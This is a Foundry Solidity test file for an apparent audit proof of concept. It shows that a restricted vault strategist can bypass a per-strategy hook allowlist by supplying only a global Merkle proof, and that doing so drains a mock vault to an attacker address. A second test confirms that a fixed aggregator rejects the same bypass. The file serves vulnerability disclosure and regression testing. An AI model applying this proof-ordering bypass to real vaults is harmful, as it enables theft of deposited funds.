// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    MiniToken,
    MiniVault,
    SuperVaultAggregator,
    SuperVaultAggregatorFixed,
    ISuperVaultAggregator
} from "./63076-strategisthooksroot-permissions-may-be-circumvented-by-any-s.sol";

contract StrategistHooksRootBypassTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant AMOUNT = 1000 * 1e6; // 1000 STOLEN-USDC (6 decimals)

    address internal constant TRANSFER_HOOK = address(uint160(0xF1F1));
    address internal constant DEPOSIT_HOOK = address(uint160(0xD3D3));
    address internal constant STRAT_HOOK_A = address(uint160(0xA1A1));
    address internal constant STRAT_HOOK_B = address(uint160(0xB2B2));

    function test_exploit_restrictedStrategist_drainsVaultViaGlobalProof() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken token = MiniToken(e.tokenAddr());

        // HARM: a strategist sandboxed by a strategyHooksRoot (that excludes the
        // transferErc20 hook) drained the vault by supplying only a GLOBAL proof.
        assertEq(e.attackerStolen(), AMOUNT, "attacker received the stolen tokens");
        assertEq(token.balanceOf(ATTACKER), AMOUNT, "attacker balance +1000 STOLEN-USDC");
        assertEq(e.vaultBalanceAfter(), 0, "vault fully drained");
        assertEq(token.balanceOf(address(e.vault())), 0, "vault holds nothing");

        // NEGATIVE CONTROL (recorded by the exploit): the fixed aggregator rejects
        // the exact same global-proof bypass, and the fixed vault is untouched.
        assertTrue(e.fixedReturnsFalse(), "fixed aggregator rejects the global-proof bypass");
        assertEq(e.fixedVaultBalanceAfter(), AMOUNT, "fixed vault not drained");
    }

    function test_control_fixedAggregator_enforcesStrategyRoot() public {
        // Rebuild the scenario directly against the FIXED aggregator to prove the
        // harm is caused by the global-proof-first ordering, not the test setup.
        MiniToken token = new MiniToken("Stolen USDC", "STOLEN-USDC", 6);
        SuperVaultAggregatorFixed agg = new SuperVaultAggregatorFixed();

        address strategist = address(this);
        MiniVault vault = new MiniVault(ISuperVaultAggregator(address(agg)), strategist, token);

        bytes memory hookArgs = abi.encode(ATTACKER, AMOUNT);
        bytes32 leafTransfer = _createLeaf(TRANSFER_HOOK, hookArgs);
        bytes32 leafDeposit = _createLeaf(DEPOSIT_HOOK, abi.encode(address(0), uint256(0)));
        bytes32 globalRoot = _hashPair(leafTransfer, leafDeposit);
        agg.setGlobalHooksRoot(globalRoot);

        bytes32 leafA = _createLeaf(STRAT_HOOK_A, abi.encode(uint256(1)));
        bytes32 leafB = _createLeaf(STRAT_HOOK_B, abi.encode(uint256(2)));
        bytes32 strategyRoot = _hashPair(leafA, leafB);
        agg.setStrategyHooksRoot(strategist, strategyRoot);

        bytes32[] memory globalProof = new bytes32[](1);
        globalProof[0] = leafDeposit;
        bytes32[] memory emptyStrategyProof = new bytes32[](0);

        token.mint(address(vault), AMOUNT);

        // The sandboxed strategist's global-proof bypass is rejected by the fix.
        vm.prank(strategist);
        vm.expectRevert(bytes("HOOK_NOT_PERMITTED"));
        vault.executeTransferHook(TRANSFER_HOOK, hookArgs, globalProof, emptyStrategyProof);

        assertEq(token.balanceOf(address(vault)), AMOUNT, "fixed vault retains its tokens");
        assertEq(token.balanceOf(ATTACKER), 0, "attacker got nothing under the fix");
    }

    function _createLeaf(address hookAddress, bytes memory hookArgs) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(hookAddress, hookArgs))));
    }

    function _hashPair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a < b ? keccak256(abi.encodePacked(a, b)) : keccak256(abi.encodePacked(b, a));
    }
}
